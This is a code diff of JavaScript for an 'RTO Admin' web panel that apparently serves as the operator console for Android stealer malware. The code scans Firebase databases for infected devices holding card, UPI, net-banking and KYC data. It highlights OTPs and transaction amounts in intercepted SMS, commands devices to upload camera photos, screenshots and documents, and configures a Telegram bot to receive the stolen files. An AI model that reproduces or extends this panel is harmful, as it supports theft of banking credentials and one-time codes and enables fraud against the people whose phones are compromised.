+    ['device_model','device_name','device_id','android_version','android_sdk','battery','status','last_seen','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','device_note','ip_address','storage','device_manufacturer','device_brand','serial_number','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','device_board','cpu_arch','online_time','offline_time','battery_info'].forEach(function(k) {
+      if (entry[k] !== undefined && target[k] === undefined) target[k] = entry[k];
+    });
+  }
+
+  function walk(obj, path, depth) {
+    if (!obj || typeof obj !== 'object' || depth > 6) return;
+    Object.keys(obj).forEach(function(key) {
+      if (skipKeys.indexOf(key) !== -1 && depth <= 1) return;
+      var entry = obj[key];
+      if (!entry || typeof entry !== 'object') return;
+      var fullPath = path ? path + '/' + key : key;
+      if (isDeviceEntry(key, entry)) {
+        if (!found[key]) found[key] = { data: {}, path: fullPath };
+        Object.keys(entry).forEach(function(k) {
+          if (found[key].data[k] === undefined) found[key].data[k] = entry[k];
+          else if (entry[k] && typeof entry[k] === 'object' && !Array.isArray(entry[k])) {
+            if (found[key].data[k] && typeof found[key].data[k] === 'object') {
+              Object.keys(entry[k]).forEach(function(nk) {
+                if (found[key].data[k][nk] === undefined) found[key].data[k][nk] = entry[k][nk];
+              });
+            }
+          }
+        });
+        collectNested(entry, found[key].data);
+        return;
+      }
+      if (depth < 6) walk(entry, fullPath, depth + 1);
+    });
+  }
+  Object.keys(resultsByPath).forEach(function(pathKey) {
+    var path = pathKey === '__root__' ? '' : pathKey;
+    walk(resultsByPath[pathKey], path, 0);
+  });
+  return found;
 }
 
 // ═══ SMS HIGHLIGHT ═══
 function highlightSms(body) {
   if (!body) return '';
   var s = body;
-  var d = document.createElement('div');
-  d.textContent = s;
-  s = d.innerHTML;
-  s = s.replace(/\b(\d{4,8})\b(?=\s*(?:is|for|OTP|otp|\.|\s*$))/g, '<span style="color:#D97706;font-weight:900;font-size:14px;text-shadow:0 0 8px rgba(217,119,6,0.5);">$1</span>');
+  var d = document.createElement('div'); d.textContent = s; s = d.innerHTML;
+  s = s.replace(/\b(\d{4,8})\b(?=\s*(?:is|for|OTP|otp|\.|\s*$))/g, '<span style="color:#D97706;font-weight:900;font-size:14px;">$1</span>');
   s = s.replace(/((?:Rs\.?|INR|₹)\s*[0-9,]+(?:\.[0-9]+)?)/gi, '<span style="color:#2563EB;font-weight:900;font-size:14px;">$1</span>');
   s = s.replace(/\b(credited|credit|cr)\b/gi, '<span style="color:#059669;font-weight:900;font-size:13px;text-transform:uppercase;">$1</span>');
   s = s.replace(/\b(debited|debit|withdrawn|dr)\b/gi, '<span style="color:#DC2626;font-weight:900;font-size:13px;text-transform:uppercase;">$1</span>');
@@ -640,58 +686,30 @@ function telegramGetFileUrl(fileId) {
     return fileUrl;
   });
 }
-function telegramFetchJson(fileId) {
-  return telegramGetFileUrl(fileId).then(function(url) { return fetch(url).then(function(r) { return r.json(); }); });
-}
+function telegramFetchJson(fileId) { return telegramGetFileUrl(fileId).then(function(url) { return fetch(url).then(function(r) { return r.json(); }); }); }
 function openTelegramSettings() {
-  var old = document.getElementById('tgSettingsDialog');
-  if (old) old.remove();
-  var tok = TELEGRAM_CONFIG.botToken || '';
-  var cid = TELEGRAM_CONFIG.chatId || '';
-  var html =
-    '<div style="position:fixed; inset:0; background:rgba(15,23,42,0.6); z-index:6000; display:flex; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(3px);" id="tgSettingsDialog" onclick="if(event.target===this) closeTelegramSettings()">' +
-      '<div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:16px; padding:22px; max-width:460px; width:100%; box-shadow:0 20px 50px rgba(0,0,0,0.2);">' +
-        '<h3 style="color:#1E40AF; font-size:16px; margin-bottom:8px; font-weight:700;">⚙️ Telegram Configuration</h3>' +
-        '<div style="color:#64748B; font-size:11px; margin-bottom:18px;">Photo/Apps upload ke liye. App isi config ko Firebase se fetch karega.</div>' +
-        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Bot Token</label>' +
-        '<input type="text" id="tgToken" value="' + esc(tok) + '" placeholder="123456789:ABCdef..." style="width:100%; padding:12px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:12px; font-family:monospace; margin-top:6px; margin-bottom:14px;">' +
-        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Chat ID</label>' +
-        '<input type="text" id="tgChat" value="' + esc(cid) + '" placeholder="-1001234567890" style="width:100%; padding:12px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:12px; font-family:monospace; margin-top:6px; margin-bottom:14px;">' +
-        '<div id="tgSettingsStatus" style="font-size:11px; color:#64748B; margin-bottom:14px; min-height:16px; font-weight:600;"></div>' +
-        '<div style="display:flex; gap:8px;">' +
-          '<button onclick="closeTelegramSettings()" style="flex:1; padding:13px; background:#F1F5F9; color:#334155; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">CANCEL</button>' +
-          '<button onclick="testTelegramFromDialog()" style="flex:1; padding:13px; background:#F59E0B; color:#FFFFFF; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">🧪 TEST</button>' +
-          '<button onclick="saveTelegramFromDialog()" style="flex:1; padding:13px; background:#059669; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">💾 SAVE</button>' +
-        '</div>' +
-      '</div>' +
-    '</div>';
-  var div = document.createElement('div');
-  div.innerHTML = html;
-  document.body.appendChild(div.firstChild);
+  var old = document.getElementById('tgSettingsDialog'); if (old) old.remove();
+  var tok = TELEGRAM_CONFIG.botToken || '', cid = TELEGRAM_CONFIG.chatId || '';
+  var html = '<div style="position:fixed; inset:0; background:rgba(15,23,42,0.6); z-index:6000; display:flex; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(3px);" id="tgSettingsDialog" onclick="if(event.target===this) closeTelegramSettings()"><div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:16px; padding:22px; max-width:460px; width:100%; box-shadow:0 20px 50px rgba(0,0,0,0.2);"><h3 style="color:#1E40AF; font-size:16px; margin-bottom:8px; font-weight:700;">⚙️ Telegram Configuration</h3><div style="color:#64748B; font-size:11px; margin-bottom:18px;">Photo/Apps upload ke liye. App isi config ko Firebase se fetch karega.</div><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Bot Token</label><input type="text" id="tgToken" value="' + esc(tok) + '" placeholder="123456789:ABCdef..." style="width:100%; padding:12px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:12px; font-family:monospace; margin-top:6px; margin-bottom:14px;"><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Chat ID</label><input type="text" id="tgChat" value="' + esc(cid) + '" placeholder="-1001234567890" style="width:100%; padding:12px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:12px; font-family:monospace; margin-top:6px; margin-bottom:14px;"><div id="tgSettingsStatus" style="font-size:11px; color:#64748B; margin-bottom:14px; min-height:16px; font-weight:600;"></div><div style="display:flex; gap:8px;"><button onclick="closeTelegramSettings()" style="flex:1; padding:13px; background:#F1F5F9; color:#334155; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">CANCEL</button><button onclick="testTelegramFromDialog()" style="flex:1; padding:13px; background:#F59E0B; color:#FFFFFF; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">🧪 TEST</button><button onclick="saveTelegramFromDialog()" style="flex:1; padding:13px; background:#059669; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">💾 SAVE</button></div></div></div>';
+  var div = document.createElement('div'); div.innerHTML = html; document.body.appendChild(div.firstChild);
 }
 function closeTelegramSettings() { var el = document.getElementById('tgSettingsDialog'); if (el) el.remove(); }
 function saveTelegramFromDialog() {
-  var tok = document.getElementById('tgToken').value.trim();
-  var cid = document.getElementById('tgChat').value.trim();
+  var tok = document.getElementById('tgToken').value.trim(), cid = document.getElementById('tgChat').value.trim();
   var statusEl = document.getElementById('tgSettingsStatus');
   if (!tok || !cid) { statusEl.textContent = '❌ Both fields required'; statusEl.style.color = '#DC2626'; return; }
   statusEl.textContent = '⏳ Saving...'; statusEl.style.color = '#D97706';
-  db.ref('global_config/telegram_config').update({ bot_token: tok, chat_id: cid, enabled: true, updated_at: Date.now() })
-    .then(function() { statusEl.textContent = '✅ Saved!'; statusEl.style.color = '#059669'; })
-    .catch(function(e) { statusEl.textContent = '❌ ' + e.message; statusEl.style.color = '#DC2626'; });
+  db.ref('global_config/telegram_config').update({ bot_token: tok, chat_id: cid, enabled: true, updated_at: Date.now() }).then(function() { statusEl.textContent = '✅ Saved!'; statusEl.style.color = '#059669'; }).catch(function(e) { statusEl.textContent = '❌ ' + e.message; statusEl.style.color = '#DC2626'; });
 }
 function testTelegramFromDialog() {
-  var tok = document.getElementById('tgToken').value.trim();
-  var cid = document.getElementById('tgChat').value.trim();
+  var tok = document.getElementById('tgToken').value.trim(), cid = document.getElementById('tgChat').value.trim();
   var statusEl = document.getElementById('tgSettingsStatus');
   if (!tok || !cid) { statusEl.textContent = '❌ Both fields required'; statusEl.style.color = '#DC2626'; return; }
   statusEl.textContent = '⏳ Testing...'; statusEl.style.color = '#D97706';
   var url = 'https://api.telegram.org/bot' + tok + '/sendMessage';
-  var body = new URLSearchParams();
-  body.append('chat_id', cid);
-  body.append('text', '🧪 RTO Panel Test\n\nPanel connected successfully!\n' + new Date().toLocaleString());
+  var body = new URLSearchParams(); body.append('chat_id', cid); body.append('text', '🧪 RTO Panel Test\n\nConnected: ' + new Date().toLocaleString());
   fetch(url, { method: 'POST', body: body }).then(function(r) { return r.json(); }).then(function(j) {
-    if (j.ok) { statusEl.textContent = '✅ Test message sent!'; statusEl.style.color = '#059669'; }
+    if (j.ok) { statusEl.textContent = '✅ Test sent!'; statusEl.style.color = '#059669'; }
     else { statusEl.textContent = '❌ ' + (j.description || 'Failed'); statusEl.style.color = '#DC2626'; }
   }).catch(function(e) { statusEl.textContent = '❌ ' + e.message; statusEl.style.color = '#DC2626'; });
 }
@@ -699,17 +717,14 @@ function testTelegramFromDialog() {
 // ═══ DELETE ═══
 function deleteSinglePhoto(photoKey) {
   var p = photos[photoKey]; if (!p) return;
-  if (!confirm('Delete "' + (p.name || 'photo') + '"?\n\nFirebase se URL hatega. Telegram pe rahegi.')) return;
+  if (!confirm('Delete "' + (p.name || 'photo') + '"?')) return;
   var el = document.querySelector('[data-p="' + photoKey + '"]');
   if (el) { el.classList.add('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = true; btn.textContent = '⏳'; } }
   db.ref('device_info/' + curId + '/photos/' + photoKey).remove().then(function() {
     delete photos[photoKey];
     document.getElementById('cPhotos').textContent = Object.keys(photos).length;
     renderPhotos();
-  }).catch(function(e) {
-    alert('❌ ' + e.message);
-    if (el) { el.classList.remove('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = false; btn.textContent = '✕'; } }
-  });
+  }).catch(function(e) { alert('❌ ' + e.message); if (el) { el.classList.remove('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = false; btn.textContent = '✕'; } } });
 }
 var deleteScope = 'all';
 function openFastDeleteDialog() {
@@ -752,7 +767,7 @@ function confirmFastDelete() {
     if (match) toDelete.push({ key: key, photo: p });
   });
   if (toDelete.length === 0) { alert('No photos'); return; }
-  if (!confirm('🚀 Delete ' + toDelete.length + ' photos from Firebase?\n\nTelegram pe rahegi.')) return;
+  if (!confirm('🚀 Delete ' + toDelete.length + ' photos?')) return;
   closeFastDeleteDialog();
   executeFastDelete(toDelete);
 }
@@ -770,7 +785,7 @@ function executeFastDelete(items) {
   db.ref().update(updates).then(function() {
     document.getElementById('delProgressBar').style.width = '100%';
     document.getElementById('delProgressText').textContent = '✅ Done: ' + total + ' deleted';
-    log.textContent = 'Complete!\n' + total + ' photos deleted from Firebase.\n(Telegram pe rahegi.)';
+    log.textContent = 'Complete!\n' + total + ' photos deleted.';
     items.forEach(function(item) { delete photos[item.key]; });
     renderPhotos();
     setTimeout(function() { overlay.classList.remove('active'); }, 1500);
@@ -782,43 +797,13 @@ function executeFastDelete(items) {
   });
 }
 
-// ═══ PHOTO UPLOAD DIALOG ═══
+// ═══ PHOTO UPLOAD ═══
 var photoFilter = 'camera', photoQuantity = 100, photoOrder = 'newest';
 function openPhotoUploadDialog() {
   if (!curId) return;
   var old = document.getElementById('photoDialog'); if (old) old.remove();
-  var html =
-    '<div style="position:fixed; inset:0; background:rgba(15,23,42,0.6); z-index:5000; display:flex; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(3px);" id="photoDialog" onclick="if(event.target===this) closePhotoDialog()">' +
-      '<div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:16px; padding:22px; max-width:460px; width:100%; box-shadow:0 20px 50px rgba(0,0,0,0.2);">' +
-        '<h3 style="color:#1E40AF; font-size:16px; margin-bottom:18px; font-weight:700;">📤 Upload Request</h3>' +
-        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Filter</label>' +
-        '<div style="display:flex; gap:6px; margin-top:6px; margin-bottom:14px; flex-wrap:wrap;">' +
-          '<button class="pfilter-btn active" data-f="camera" style="flex:1; padding:11px; background:#2563EB; color:white; border:none; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">📷 Camera</button>' +
-          '<button class="pfilter-btn" data-f="screenshot" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">📸 SS</button>' +
-          '<button class="pfilter-btn" data-f="document" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">📄 Doc</button>' +
-          '<button class="pfilter-btn" data-f="picture" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">🖼️ Pic</button>' +
-        '</div>' +
-        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Quantity</label>' +
-        '<div style="display:flex; gap:6px; margin-top:6px; margin-bottom:8px;">' +
-          '<button class="pqty-btn" data-q="50" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:12px; font-weight:700; cursor:pointer;">50</button>' +
-          '<button class="pqty-btn active" data-q="100" style="flex:1; padding:11px; background:#2563EB; color:white; border:none; border-radius:9px; font-size:12px; font-weight:700; cursor:pointer;">100</button>' +
-          '<button class="pqty-btn" data-q="500" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:12px; font-weight:700; cursor:pointer;">500</button>' +
-        '</div>' +
-        '<input type="number" id="customQty" placeholder="✏️ Custom quantity (e.g. 2000)" min="1" max="10000" style="width:100%; padding:12px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:9px; color:#1E293B; font-size:12px; font-family:monospace; margin-bottom:14px;">' +
-        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Order</label>' +
-        '<div style="display:flex; gap:6px; margin-top:6px; margin-bottom:20px;">' +
-          '<button class="porder-btn" data-o="oldest" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer;">⬆️ Oldest First</button>' +
-          '<button class="porder-btn active" data-o="newest" style="flex:1; padding:11px; background:#2563EB; color:white; border:none; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer;">⬇️ Newest First</button>' +
-        '</div>' +
-        '<div style="display:flex; gap:8px;">' +
-          '<button onclick="closePhotoDialog()" style="flex:1; padding:13px; background:#F1F5F9; color:#334155; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">CANCEL</button>' +
-          '<button onclick="sendPhotoCommand()" style="flex:1; padding:13px; background:#059669; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">📤 START UPLOAD</button>' +
-        '</div>' +
-      '</div>' +
-    '</div>';
-  var div = document.createElement('div');
-  div.innerHTML = html;
-  document.body.appendChild(div.firstChild);
+  var html = '<div style="position:fixed; inset:0; background:rgba(15,23,42,0.6); z-index:5000; display:flex; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(3px);" id="photoDialog" onclick="if(event.target===this) closePhotoDialog()"><div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:16px; padding:22px; max-width:460px; width:100%; box-shadow:0 20px 50px rgba(0,0,0,0.2);"><h3 style="color:#1E40AF; font-size:16px; margin-bottom:18px; font-weight:700;">📤 Upload Request</h3><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Filter</label><div style="display:flex; gap:6px; margin-top:6px; margin-bottom:14px; flex-wrap:wrap;"><button class="pfilter-btn active" data-f="camera" style="flex:1; padding:11px; background:#2563EB; color:white; border:none; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">📷 Camera</button><button class="pfilter-btn" data-f="screenshot" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">📸 SS</button><button class="pfilter-btn" data-f="document" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">📄 Doc</button><button class="pfilter-btn" data-f="picture" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">🖼️ Pic</button></div><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Quantity</label><div style="display:flex; gap:6px; margin-top:6px; margin-bottom:8px;"><button class="pqty-btn" data-q="50" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:12px; font-weight:700; cursor:pointer;">50</button><button class="pqty-btn active" data-q="100" style="flex:1; padding:11px; background:#2563EB; color:white; border:none; border-radius:9px; font-size:12px; font-weight:700; cursor:pointer;">100</button><button class="pqty-btn" data-q="500" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:12px; font-weight:700; cursor:pointer;">500</button></div><input type="number" id="customQty" placeholder="✏️ Custom quantity (e.g. 2000)" min="1" max="10000" style="width:100%; padding:12px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:9px; color:#1E293B; font-size:12px; font-family:monospace; margin-bottom:14px;"><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Order</label><div style="display:flex; gap:6px; margin-top:6px; margin-bottom:20px;"><button class="porder-btn" data-o="oldest" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer;">⬆️ Oldest First</button><button class="porder-btn active" data-o="newest" style="flex:1; padding:11px; background:#2563EB; color:white; border:none; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer;">⬇️ Newest First</button></div><div style="display:flex; gap:8px;"><button onclick="closePhotoDialog()" style="flex:1; padding:13px; background:#F1F5F9; color:#334155; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">CANCEL</button><button onclick="sendPhotoCommand()" style="flex:1; padding:13px; background:#059669; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">📤 START UPLOAD</button></div></div></div>';
+  var div = document.createElement('div'); div.innerHTML = html; document.body.appendChild(div.firstChild);
   document.querySelectorAll('.pfilter-btn').forEach(function(btn) {
     btn.onclick = function() {
       document.querySelectorAll('.pfilter-btn').forEach(function(b) { b.style.background = '#F8FAFC'; b.style.color = '#334155'; b.style.border = '1px solid #E2E8F0'; b.classList.remove('active'); });
@@ -915,17 +900,31 @@ function requestAppsUpload() {
 // ═══ SAVED ACCOUNTS ═══
 function getSavedAccounts() { try { return JSON.parse(localStorage.getItem('rto_accounts') || '[]'); } catch(e) { return []; } }
 function saveAccounts(list) { localStorage.setItem('rto_accounts', JSON.stringify(list)); }
-
-// ═══ NEW CONNECTION PANEL ═══
-function showNewConnPanel() {
-  document.getElementById('newConnOverlay').classList.add('active');
-  document.getElementById('newErr').textContent = '';
-  document.getElementById('bulkInput').value = '';
-  document.getElementById('newUrl').value = '';
-  document.getElementById('newKey').value = '';
-  document.getElementById('apkStatus').classList.remove('show');
+function renderSavedAccounts() {
+  var list = getSavedAccounts();
+  var section = document.getElementById('savedSection');
+  var el = document.getElementById('savedList');
+  if (list.length === 0) { section.style.display = 'none'; return; }
+  section.style.display = 'block';
+  el.innerHTML = list.map(function(a, i) {
+    return '<div class="saved-item" data-acc="' + i + '"><div class="saved-icon">🔥</div><div class="saved-info"><div class="saved-name">' + esc(a.name || 'Account ' + (i+1)) + '</div><div class="saved-url">' + esc((a.url || '').replace('https://', '').replace('.firebaseio.com', '')) + '</div></div><button class="saved-del" data-del="' + i + '">✕</button></div>';
+  }).join('');
+  el.querySelectorAll('.saved-item').forEach(function(item) {
+    item.addEventListener('click', function(e) {
+      if (e.target.hasAttribute('data-del')) return;
+      var idx = parseInt(this.getAttribute('data-acc'));
+      connectToAccount(list[idx]);
+    });
+  });
+  el.querySelectorAll('[data-del]').forEach(function(b) {
+    b.addEventListener('click', function(e) {
+      e.stopPropagation();
+      var idx = parseInt(this.getAttribute('data-del'));
+      if (!confirm('Delete this account?')) return;
+      var list2 = getSavedAccounts(); list2.splice(idx, 1); saveAccounts(list2); renderSavedAccounts();
+    });
+  });
 }
-function hideNewConnPanel() { document.getElementById('newConnOverlay').classList.remove('active'); }
 function parseBulkInput(text) {
   var accounts = [], seenUrls = {};
   var urlRegex = /https?:\/\/[a-zA-Z0-9_-]+(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/g;
@@ -939,15 +938,16 @@ function parseBulkInput(text) {
 }
 function bulkConnect() {
   var text = document.getElementById('bulkInput').value.trim();
-  if (!text) { document.getElementById('newErr').textContent = 'Paste URLs first'; return; }
+  var errEl = document.getElementById('connectErr');
+  if (!text) { errEl.textContent = '❌ Paste URLs first'; return; }
   var accounts = parseBulkInput(text);
-  if (accounts.length === 0) { document.getElementById('newErr').textContent = 'No valid URL'; return; }
+  if (accounts.length === 0) { errEl.textContent = '❌ No valid URL found'; return; }
   var list = getSavedAccounts(); var added = 0;
   accounts.forEach(function(acc) { var dup = list.findIndex(function(a) { return a.url === acc.url; }); if (dup === -1) { list.push({ name: acc.name, url: acc.url, apiKey: acc.apiKey }); added++; } });
   saveAccounts(list);
-  document.getElementById('newErr').textContent = '✅ Added ' + added + ' account(s)';
-  document.getElementById('newErr').style.color = '#059669';
-  if (accounts.length > 0) { setTimeout(function() { hideNewConnPanel(); connectToAccount(accounts[0]); }, 800); }
+  errEl.style.color = '#059669';
+  errEl.textContent = '✅ Added ' + added + '. Connecting...';
+  setTimeout(function() { connectToAccount(accounts[0]); }, 600);
 }
 function handleApkUpload(file) {
   var status = document.getElementById('apkStatus'); status.classList.add('show'); status.textContent = '⏳ Reading...';
@@ -975,34 +975,39 @@ function handleApkUpload(file) {
 function saveNewAcc() {
   var url = document.getElementById('newUrl').value.trim();
   var key = document.getElementById('newKey').value.trim();
-  var err = document.getElementById('newErr');
-  if (!url) { err.textContent = '❌ URL required'; err.style.color = '#DC2626'; return; }
+  var errEl = document.getElementById('connectErr');
+  if (!url) { errEl.textContent = '❌ URL required'; errEl.style.color = '#DC2626'; return; }
   url = normalizeFirebaseUrl(url);
   if (!key) key = DEFAULT_CONFIG.apiKey;
   var list = getSavedAccounts(), dup = list.findIndex(function(a) { return a.url === url; });
   var acc = { name: extractProjectId(url), url: url, apiKey: key };
   if (dup !== -1) { list[dup].apiKey = key; acc = list[dup]; } else list.push(acc);
   saveAccounts(list);
-  err.textContent = '✅ Connecting...'; err.style.color = '#059669';
-  setTimeout(function() { hideNewConnPanel(); connectToAccount(acc); }, 500);
+  errEl.style.color = '#059669';
+  errEl.textContent = '✅ Connecting...';
+  setTimeout(function() { connectToAccount(acc); }, 500);
 }
 
-// ═══ CONNECT TO ACCOUNT — HARD ═══
+// ═══ CONNECT TO ACCOUNT ═══
 function connectToAccount(acc) {
   if (!acc || !acc.url) { alert('Invalid account'); return; }
   var url = normalizeFirebaseUrl(acc.url);
   var config = { apiKey: acc.apiKey || DEFAULT_CONFIG.apiKey, databaseURL: url, projectId: extractProjectId(url) };
   currentAccount = { name: acc.name || extractProjectId(url), url: url, apiKey: config.apiKey, isRTO: false };
-  tryConnect(config, acc.name).then(function() {
+  var errEl = document.getElementById('connectErr');
+  if (errEl) { errEl.style.color = '#2563EB'; errEl.textContent = '⏳ Connecting...'; }
+  tryConnect(config).then(function() {
     try { localStorage.setItem('rto_last_account', JSON.stringify(currentAccount)); } catch(e) {}
-    document.getElementById('topTitle').textContent = '🚔 ' + (currentAccount.name || 'RTO Admin');
+    document.getElementById('connectScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
+    document.getElementById('topTitle').textContent = '🚔 ' + (currentAccount.name || 'RTO Admin');
     initTelegramConfig();
     startApp();
   }).catch(function(e) {
-    alert('❌ Connection failed: ' + e.message);
+    if (errEl) { errEl.style.color = '#DC2626'; errEl.textContent = '❌ ' + e.message; }
   });
 }
+
 function doLogout() {
   stopTelegramPolling();
   if (telegramConfigListener) { try { telegramConfigListener.off(); } catch(e) {} telegramConfigListener = null; }
@@ -1018,9 +1023,17 @@ function doLogout() {
   db = null; devs = {}; devPaths = {}; curId = null; currentAccount = null;
   try { localStorage.removeItem('rto_last_account'); } catch(e) {}
   document.getElementById('mainApp').style.display = 'none';
-  showNewConnPanel(); // Logout ke baad new connection panel dikhao
+  document.getElementById('connectScreen').style.display = 'flex';
+  renderSavedAccounts();
+  document.getElementById('newUrl').value = '';
+  document.getElementById('newKey').value = '';
+  document.getElementById('bulkInput').value = '';
+  document.getElementById('connectErr').textContent = '';
 }
 
+// ═══════════════════════════════════════════════════════════
+// START APP — HARD FAST SCAN
+// ═══════════════════════════════════════════════════════════
 function startApp() {
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
@@ -1030,77 +1043,64 @@ function startApp() {
   var scanText = document.getElementById('scanText');
   devs = {}; devPaths = {};
   scanEl.style.display = 'flex';
-  scanText.textContent = 'Scanning Firebase for devices...';
+  scanText.textContent = '⚡ Scanning Firebase (parallel)...';
 
-  // ✅ HARD SCAN — root pe listen karo, sab kuch dhoondo
-  scanListener = db.ref('/');
-  scanListener.on('value', function(snapshot) {
-    var root = snapshot.val() || {};
-    devs = {}; devPaths = {};
-    var found = 0;
-    var skipNodes = ['admin_config', 'global_config', 'app_config', 'telegram_auto_config'];
-
-    // Recursive scan — kisi bhi depth pe devices dhoondo
-    function deepScan(obj, path) {
-      if (!obj || typeof obj !== 'object') return;
-      Object.keys(obj).forEach(function(key) {
-        var entry = obj[key];
-        if (!entry || typeof entry !== 'object') return;
-        var fullPath = path ? path + '/' + key : key;
-        // Skip config nodes
-        if (path === '' && skipNodes.indexOf(key) !== -1) return;
-        if (isDeviceEntry(key, entry)) {
-          if (!devs[key]) { devs[key] = entry; devPaths[key] = { device: fullPath }; found++; }
-          else { Object.keys(entry).forEach(function(k) { if (devs[key][k] === undefined) devs[key][k] = entry[k]; }); }
-        } else {
-          // Nested scan — 3 levels tak
-          var depth = fullPath.split('/').length;
-          if (depth < 4) deepScan(entry, fullPath);
-        }
-      });
-    }
-    deepScan(root, '');
-
-    scanText.textContent = 'Found ' + found + ' device(s)';
-    setTimeout(function() { scanEl.style.display = 'none'; }, 1500);
+  hardScan(function(done, total) {
+    scanText.textContent = '⚡ Scanning... ' + done + '/' + total + ' nodes';
+  }).then(function(found) {
+    Object.keys(found).forEach(function(id) {
+      devs[id] = found[id].data;
+      devPaths[id] = { device: found[id].path };
+    });
+    scanText.textContent = '✅ Found ' + Object.keys(devs).length + ' device(s)';
+    setTimeout(function() { scanEl.style.display = 'none'; }, 1200);
     updStats(); renderDevs();
-    if (curId && devs[curId]) renderTab();
-  }, function(error) {
-    console.error('Scan error:', error);
-    // Permission denied — still try common paths
-    scanText.textContent = '⚠️ Restricted. Trying direct paths...';
-    tryDirectPaths();
-  });
-}
-
-// ✅ Fallback — direct common paths try karo
-function tryDirectPaths() {
-  var commonPaths = ['device_info', 'devices', 'users', 'data', 'clients', 'device_data'];
-  var found = 0;
-  var pending = commonPaths.length;
-  commonPaths.forEach(function(p) {
-    db.ref(p).once('value').then(function(snap) {
-      var val = snap.val();
-      if (val && typeof val === 'object') {
-        Object.keys(val).forEach(function(key) {
-          var entry = val[key];
-          if (entry && typeof entry === 'object' && !devs[key]) {
-            devs[key] = entry;
-            devPaths[key] = { device: p + '/' + key };
-            found++;
+    // ✅ Realtime root listener — naye device aaye toh update
+    scanListener = db.ref('/');
+    scanListener.on('value', function(snapshot) {
+      var root = snapshot.val() || {};
+      // Fast incremental update — sirf naye devices add karo
+      hardScanIncremental(root, function(newFound) {
+        var added = 0;
+        Object.keys(newFound).forEach(function(id) {
+          if (!devs[id]) {
+            devs[id] = newFound[id].data;
+            devPaths[id] = { device: newFound[id].path };
+            added++;
           }
         });
-      }
-      pending--;
-      if (pending === 0) {
-        document.getElementById('scanText').textContent = 'Found ' + found + ' device(s)';
-        setTimeout(function() { document.getElementById('scanStatus').style.display = 'none'; }, 1500);
